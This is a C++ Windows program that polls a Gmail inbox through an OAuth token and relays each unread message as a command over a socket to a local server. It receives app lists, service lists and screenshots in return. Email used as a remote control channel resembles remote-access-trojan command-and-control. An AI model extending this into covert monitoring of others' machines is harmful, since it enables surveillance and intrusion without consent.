// gmail.cpp : Defines the entry point for the application.
//

#include "gmail.h"
#include "client_socket.h"

int main() {
    std::string client_id = "YOUR_CLIENT_ID"; // Replace with your Google Cloud client ID
    std::string client_secret = "YOUR_CLIENT_SECRET"; // Replace with your Google Cloud client secret
    std::string authorization_code = "YOUR_AUTHORIZATION_CODE"; // Replace with the authorization code you received
    std::string redirect_uri = "http://localhost:8080"; // Replace with your redirect URI

    std::string access_token;
    std::string refresh_token;

    //// Exchange auth code for access token
    //if (exchangeAuthCodeForAccessToken(client_id, client_secret, authorization_code, redirect_uri, access_token, refresh_token)) {
    //    // Save access token to file
    //    saveAccessTokenToFile(access_token);
    //}
    //else {
    //    std::cerr << "Failed to exchange authorization code for access token." << std::endl;
    //}

    //// Now, if you want to refresh the access token later
    //std::string new_access_token;
    //if (refreshAccessToken(client_id, client_secret, refresh_token, new_access_token)) {
    //    // Save the new access token to file
    //    saveAccessTokenToFile(new_access_token);
    //}
    //else {
    //    std::cerr << "Failed to refresh access token." << std::endl;
    //}


    // SOCKET
    if (!initializeWinsock()) {
        return 1;
    }

    SOCKET clientSocket = createClientSocket();
    if (clientSocket == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    if (connectToServer(clientSocket, "127.0.0.1", 8080)) {
        // Load your access token from the file or set it manually
        std::ifstream token_file("access_token.txt");
        if (token_file.is_open()) {
            std::getline(token_file, access_token);
            token_file.close();
        }
        else {
            std::cerr << "Unable to open access token file." << std::endl;
            return 1;
        }


        int interval_seconds = 3; // Poll every 5 seconds
        while (true) {
            //system("cls");

            if (_kbhit()) {
                char key = _getch();
                if (key == 27) {  // 27 is the ASCII code for ESC key
                    std::cout << "ESC key pressed. Exiting..." << std::endl;
                    break;
                }
            }

            std::cout << "Checking for new messages..." << std::endl;

            std::vector<std::string> tasks = getUnreadMessageContents(access_token);
            for (const std::string& messageContent : tasks) {
                if (sendString(clientSocket, messageContent)) {
                    std::cout << "Sent successfully!\n";
                    if (messageContent.substr(0, 8) == "list app") {
                        receiveFile(clientSocket, L"apps_list.txt");
                    }
                    else if (messageContent.substr(0, 12) == "list service") {
                        receiveFile(clientSocket, L"services_list.txt");
                    }
                    if (messageContent.substr(0, 15) == "take screenshot") {
                        receiveFile(clientSocket, L"screenshot.jpeg");
                    }
                }
            }

            // Wait for the specified interval before checking again
            std::this_thread::sleep_for(std::chrono::seconds(interval_seconds));
        }
    }
    cleanup(clientSocket);

    return 0;
}
